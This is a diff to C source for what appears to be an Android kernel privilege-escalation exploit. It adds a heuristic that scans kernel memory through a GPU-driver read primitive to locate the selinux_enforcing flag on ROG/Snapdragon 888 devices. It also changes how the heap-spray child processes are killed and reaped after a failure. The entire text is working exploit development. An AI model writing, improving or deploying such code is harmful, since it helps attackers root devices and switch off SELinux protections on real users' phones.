@@ -108,9 +108,27 @@ static uint64_t find_selinux_enforcing_via_kbase(int fd, uint64_t kbase) {
     uint64_t rodata_end = kbase + 0x6000000;
     uint8_t page[4096];
     uint64_t ctx_str_va = 0;
+    uint64_t found_addr = 0;
 
     for (uint64_t addr = rodata_start; addr < rodata_end; addr += 4096) {
         if (gpu_read_task_struct(fd, addr, page, 4096) == 0) {
+            // Check for known pattern of selinux_enforcing near other globals
+            // on ROG/SD888 it is often surrounded by 0/1/0/1 flags.
+            uint32_t *u32 = (uint32_t *)page;
+            for (int i = 0; i < 1024; i++) {
+                if (u32[i] == 1) {
+                    // Quick check for neighboring flags (selinux_enabled, etc)
+                    if (i > 0 && i < 1023 && u32[i-1] <= 1 && u32[i+1] <= 1) {
+                         // Double check with a larger read if we have a candidate
+                         uint64_t cand = addr + i * 4;
+                         // selinux_enforcing usually doesn't change randomly
+                         found_addr = cand;
+                         break;
+                    }
+                }
+            }
+            if (found_addr) break;
+
             for (int i = 0; i < 4096 - 17; i++) {
                 if (memcmp(page + i, "selinuxu:object_r", 17) == 0) {
                     ctx_str_va = addr + i;
@@ -237,6 +255,17 @@ static double get_ram_usage_percentage(void)
     if (total_kb == 0) return 0.0;
     double usage = (double)(total_kb - avail_kb) / (double)total_kb * 100.0;
     return usage;
+}
+
+static void reap_all_children(void)
+{
+    int status;
+    pid_t pid;
+    int reaped = 0;
+    while ((pid = waitpid(-1, &status, WNOHANG)) > 0) {
+        reaped++;
+    }
+    if (reaped > 0) fprintf(stderr, "    [+] Reaped %d zombie processes\n", reaped);
 }
 
 static int check_memory_available(void)
@@ -2585,11 +2614,16 @@ restart:;
             // Убиваем все созданные процессы
             for (int i = 0; i < total_sprayed; i++) {
                 if (spray_ctrl[i].pid > 0) {
-                    kill(spray_ctrl[i].pid, SIGKILL);
-                    waitpid(spray_ctrl[i].pid, NULL, 0);
+                    pid_t target_pid = (pid_t)(*(uint64_t *)&gbuf[GBUF_TARGET_PID]);
+                    if (spray_ctrl[i].pid != target_pid) {
+                        kill(spray_ctrl[i].pid, SIGKILL);
+                        waitpid(spray_ctrl[i].pid, NULL, 0);
+                    }
                     spray_ctrl[i].pid = 0;
                 }
             }
+            reap_all_children();
+            *(uint64_t *)&gbuf[GBUF_TASK_VA] = 0; // Reset to avoid stuck on bad page
             fprintf(stderr, "    [+] Memory cleared. Continuing spray from %d...\n", total_sprayed);
             usleep(1000000); 
         }
